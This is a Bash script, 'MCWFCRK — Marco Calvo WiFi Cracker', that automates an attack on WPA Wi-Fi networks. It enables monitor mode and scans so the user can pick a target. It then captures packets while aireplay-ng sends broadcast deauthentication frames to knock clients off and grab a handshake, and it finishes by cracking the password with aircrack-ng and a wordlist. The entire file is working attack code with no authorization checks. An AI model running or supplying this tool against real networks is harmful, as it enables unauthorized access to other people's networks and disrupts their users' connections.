#!/bin/bash
tput civis
trap 'tput cnorm 2>/dev/null' EXIT INT TERM
clear
echo""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'

# Format
BOLD='\033[1m'
NC='\033[0m'

function show_banner {
  echo -e "${BOLD}${CYAN}MCWFCRK — Marco Calvo WiFi Cracker${NC}"
  echo ""
}

show_banner

# ---States---------------------------------------
function info { 
  echo -e "${BOLD}${BLUE}[*] $1 ${NC}"
}

function success {
  echo -e "${BOLD}${GREEN}[+] $1 ${NC}"
}

function error {
  echo -e "${BOLD}${RED}[-] $1 ${NC}"
  echo ""
  exit 1
}

function warning {
  echo -e "${BOLD}${YELLOW}[!] $1 ${NC}"
}

function ask {
  tput cnorm
  echo -ne "${BOLD}${PURPLE}[?] $1 ${NC}"
}

# ---Cleanup---------------------------------------
function cleanup_process {
  if [[ -z "$monitor_interface" ]] && [[ -z "$(ls /tmp/captura_*.cap 2>/dev/null)" ]]; then
    return
  fi

  info "Cleaning up resources..."

  if [[ -n "$monitor_interface" ]]; then
    info "Deactivating monitor mode on $monitor_interface..."
    sudo airmon-ng stop "$monitor_interface" >/dev/null 2>&1
    sleep 1
    success "Monitor mode deactivated."
  fi

  if [[ -n "$(ls /tmp/captura_*.cap 2>/dev/null)" ]]; then
    info "Removing temporary capture files..."
    rm -f /tmp/captura_*.cap 2>/dev/null
    rm -f /tmp/captura_*.csv 2>/dev/null
    success "Cleanup completed."
  fi

  pkill -f "xterm.*airodump" 2>/dev/null
  pkill -f "xterm.*aireplay" 2>/dev/null
  pkill -f "xterm.*aircrack" 2>/dev/null
}


# ---Help---------------------------------------
function help_menu {
  ask "Try: bash $0 -w /path/to/your/wordlist"
  echo ""
  echo ""
}


# ---Args---------------------------------------
while [[ $# -gt 0 ]]; do
  case "$1" in

    -w|--wordlist)
      wordlist="$2"
      shift 2
      ;;

    -h|--help)
      help_menu
      exit 0
      ;;

    *)
      error "Invalid option: $1"
      ;;
  esac
done

if [[ -z "$wordlist" ]]; then
  error "You must to proportionate a wordlist, use -w or --wordlist"
  exit 1
fi

# ---Instalation---------------------------------------
function install_package {
  local package="$1"
  info "Installing $package..."

  if command -v apt-get >/dev/null 2>&1; then
    if sudo apt-get update -qq >/dev/null 2>&1 && sudo apt-get install -qq -y "$package" >/dev/null 2>&1; then
      success "$package installed successfully."
      return 0
    fi
  fi

  error "Failed to install $package."
}

function install_tools {
  install_package aircrack-ng
}

function install_xterm {
  install_package xterm
}

# ---Checks---------------------------------------
function check_sudo {
  if [ "$EUID" -eq 0 ]; then
    success "Running as root."
    return 0
  elif sudo -v -n >/dev/null 2>&1; then
    success "Sudo credentials cached."
    return 0
  else
    error "This script must be run as root or with sudo privileges."
  fi
}

function check_tools {
  if command -v airmon-ng airodump-ng aireplay-ng aircrack-ng >/dev/null 2>&1; then
    success "Aircrack suite is installed."
  else
    warning "Aircrack suite not found."
    install_tools
  fi

  if command -v xterm >/dev/null 2>&1; then
    success "xterm is installed."
  else
    warning "xterm not found."
    install_xterm
  fi
}

function check_wordlist {
  if [[ -f "$wordlist" ]]; then
    success "Wordlist found at: $wordlist"
  else
    error "Wordlist not found: $wordlist"
  fi
}

# ---Interface Selection---------------------------------------
function activate_monitor_mode {
  info "Checking for available interfaces in monitor mode..."
  
  existing_monitor=$(sudo airmon-ng 2>/dev/null | grep -i "monitor" | awk '{print $1}' | head -1)
  
  if [[ -n "$existing_monitor" ]]; then
    success "Found existing monitor interface: $existing_monitor"
    monitor_interface="$existing_monitor"
    return
  fi
  
  warning "No monitor interface found. Displaying available interfaces:"
  echo ""
  sudo airmon-ng
  echo ""
  
  ask "Enter the interface name to activate monitor mode (e.g., wlan0): "
  read -r interface
  
  if [[ -z "$interface" ]]; then
    error "No interface provided."
  fi
  
  info "Activating monitor mode on $interface..."
  
  if sudo airmon-ng start "$interface" >/dev/null 2>&1; then
    sleep 2
    monitor_interface=$(sudo iwconfig 2>/dev/null | grep "Mode:Monitor" -B1 | head -1 | awk '{print $1}')
    if [[ -z "$monitor_interface" ]]; then
      monitor_interface="${interface}mon"
    fi
    success "Monitor mode activated: $monitor_interface"
  else
    error "Failed to activate monitor mode."
  fi
}

# ---Target Selection---------------------------------------
function close_scan_window {
  if [[ -n "$scan_pid" ]]; then
    kill "$scan_pid" 2>/dev/null
    wait "$scan_pid" 2>/dev/null
  fi
  sudo pkill -f "airodump-ng ${monitor_interface} --band bga" 2>/dev/null
}

function select_target {
  info "Scanning for wireless networks on $monitor_interface..."
  echo ""

  sleep 1
  xterm -geometry 100x30 -fn "9x15" -title "Network Scan" -e "sudo airodump-ng $monitor_interface --band bga" &
  scan_pid=$!

  echo ""
  ask "Enter the BSSID (MAC address) of the target network: "
  read -r bssid

  if [[ -z "$bssid" ]]; then
    error "BSSID is required."
  fi

  ask "Enter the channel of the target network: "
  read -r channel

  if [[ -z "$channel" ]]; then
    error "Channel is required."
  fi

  success "Target selected - BSSID: $bssid, Channel: $channel"
  close_scan_window
}

# ---Packet Capture---------------------------------------
function capture_packets {
  info "Starting packet capture and deauthentication attack..."
  echo ""

  capture_dir="/tmp"
  capture_file="$capture_dir/captura_$(date +%s)"

  info "Opening packet capture window..."
  xterm -geometry 100x30 -fn "9x15" -title "Packet Capture" -e "sudo airodump-ng $monitor_interface -c $channel --bssid $bssid -w $capture_file" &
  capture_pid=$!

  sleep 3

  info "Opening deauthentication window..."
  xterm -geometry 100x30 -fn "9x15" -title "Deauthentication Attack" -hold -e "sudo aireplay-ng -0 5 -a $bssid -c FF:FF:FF:FF:FF:FF $monitor_interface" &
  deauth_pid=$!

  for ((i=0; i<20; i++)); do
    sudo pgrep -x aireplay-ng >/dev/null 2>&1 && break
    sleep 0.5
  done

  while sudo pgrep -x aireplay-ng >/dev/null 2>&1; do
    sleep 1
  done

  sleep 3

  kill "$deauth_pid" 2>/dev/null
  wait "$deauth_pid" 2>/dev/null

  sleep 3

  kill "$capture_pid" 2>/dev/null
  sudo pkill -f "airodump-ng ${monitor_interface} -c ${channel} --bssid ${bssid}" 2>/dev/null
  wait "$capture_pid" 2>/dev/null

  capture_file_full=$(ls -t "$capture_dir"/captura_*-01.cap 2>/dev/null | head -n1)
  
  if [[ -n "$capture_file_full" ]]; then
    success "Packet capture completed: $capture_file_full"
  else
    error "Packet capture file not found."
  fi
}

# ---Crack Password---------------------------------------
function crack_password {
  info "Starting password cracking process..."
  echo ""
  
  capture_file=$(ls -t /tmp/captura_*-01.cap 2>/dev/null | head -n1)
  
  if [[ -z "$capture_file" ]]; then
    error "No capture file found."
  fi
  
  success "Using capture file: $capture_file"
  success "Using wordlist: $wordlist"
  echo ""
  
  sleep 1
  xterm -geometry 100x40 -fn "9x15" -title "Aircrack-ng - WiFi Password Cracker" -hold -e "sudo aircrack-ng -w $wordlist -b $bssid $capture_file"
}

# ---Main---------------------------------------
check_sudo
check_tools
check_wordlist

trap 'tput cnorm 2>/dev/null; cleanup_process; exit' EXIT INT TERM

activate_monitor_mode
select_target
capture_packets
crack_password

tput cnorm
success "Process completed. Exiting..."
exit 0
